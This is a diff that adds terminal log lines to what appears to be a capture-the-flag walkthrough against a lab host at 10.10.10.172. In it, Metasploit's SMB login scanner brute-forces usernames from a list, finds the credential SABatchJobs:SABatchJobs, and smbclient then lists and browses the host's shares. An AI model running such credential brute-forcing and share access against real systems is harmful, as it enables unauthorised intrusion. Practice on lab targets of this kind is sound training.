@@ -62,3 +62,146 @@ allenwest1@debian:~/Desktop/enum4linux-0.8.9$ ./enum4linux.pl 10.10.10.172
 .
 .
 .
+allenwest1@debian:~/Desktop/enum4linux-0.8.9$ cd ..
+allenwest1@debian:~/Desktop$ nano users.txt
+allenwest1@debian:~/Desktop$ nano pass.txt
+allenwest1@debian:~/Desktop$ msfconsole
+Found a database at /home/allenwest1/.msf4/db, checking to see if it is started
+Starting database at /home/allenwest1/.msf4/db...success
+[?] Initial MSF web service account username? [allenwest1]: 
+[?] Initial MSF web service account password? (Leave blank for random password): 
+Generating SSL key and certificate for MSF web service
+MSF web service PID file found, but no active process running as PID 1802
+Deleting MSF web service PID file /home/allenwest1/.msf4/msf-ws.pid
+Attempting to start MSF web service...failed
+[!] MSF web service appears to be started, but may not operate as expected.
+MSF web service expects authentication. If you wish to reinitialize the web service account you will need to reinitialize the database.
+Please see /home/allenwest1/.msf4/logs/msf-ws.log for additional details.
+This copy of metasploit-framework is more than two weeks old.
+ Consider running 'msfupdate' to update to the latest version.
+                                                  
+     ,           ,
+    /             \                                                     
+   ((__---,,,---__))                                                    
+      (_) O O (_)_________                                              
+         \ _ /            |\                                            
+          o_o \   M S F   | \                                           
+               \   _____  |  *                                          
+                |||   WW|||                                             
+                |||     |||                                             
+                                                                        
+
+       =[ metasploit v5.0.83-dev-                         ]
++ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
++ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: View useful productivity tips with the tip command, or view them all with tip -l
+
+msf5 > search smb_login
+
+Matching Modules
+================
+
+   #  Name                             Disclosure Date  Rank    Check  Description
+   -  ----                             ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner
+
+
+msf5 > use 0
+msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.172
+RHOSTS => 10.10.10.172
+msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE users.txt
+USER_FILE => users.txt
+msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE pass.txt
+USERPASS_FILE => pass.txt
+msf5 auxiliary(scanner/smb/smb_login) > exploit
+
+[*] 10.10.10.172:445      - 10.10.10.172:445 - Starting SMB login bruteforce
+[*] 10.10.10.172:445      - 10.10.10.172:445 - Correct credentials, but unable to login: '.\Guest:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\SABatchJobs:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\AAD_987d7f2f57d2:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\svc-ata:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\svc-bexec:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\svc-netapp:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\dgalanos:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\roleary:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\smorgan:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\:',
+[*] 10.10.10.172:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE pass.txt
+PASS_FILE => pass.txt
+msf5 auxiliary(scanner/smb/smb_login) > exploit
+
+[*] 10.10.10.172:445      - 10.10.10.172:445 - Starting SMB login bruteforce
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:Guest',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:mhope',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:SABatchJobs',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:AAD_987d7f2f57d2',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:svc-ata',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:svc-bexec',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:svc-netapp',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:dgalanos',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:roleary',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\Guest:smorgan',
+[*] 10.10.10.172:445      - 10.10.10.172:445 - Correct credentials, but unable to login: '.\Guest:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:Guest',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:mhope',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:SABatchJobs',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:AAD_987d7f2f57d2',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:svc-ata',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:svc-bexec',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:svc-netapp',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:dgalanos',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:roleary',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:smorgan',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\mhope:',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\SABatchJobs:Guest',
+[-] 10.10.10.172:445      - 10.10.10.172:445 - Failed: '.\SABatchJobs:mhope',
+[+] 10.10.10.172:445      - 10.10.10.172:445 - Success: '.\SABatchJobs:SABatchJobs'
+.
+.
+.
+// [+] 10.10.10.172:445      - 10.10.10.172:445 - Success: '.\SABatchJobs:SABatchJobs'
+.
+.
+.
+allenwest1@debian:~/Desktop$ smbclient -L 10.10.10.172 -U SABatchJobs
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\SABatchJobs's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        azure_uploads   Disk      
+        C$              Disk      Default share
+        E$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+        users$          Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+allenwest1@debian:~/Desktop$ smbclient //10.10.10.172/users$ -U SABatchJobs
+mkdir failed on directory /var/run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Enter WORKGROUP\SABatchJobs's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Jan  3 08:12:48 2020
+  ..                                  D        0  Fri Jan  3 08:12:48 2020
+  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
+  mhope                               D        0  Fri Jan  3 08:41:18 2020
+  roleary                             D        0  Fri Jan  3 08:10:30 2020
+  smorgan                             D        0  Fri Jan  3 08:10:24 2020
+
+                524031 blocks of size 4096. 519955 blocks available
+smb: \> 
+.
+.
+.
+// continue in asSABatchJobs1.bash
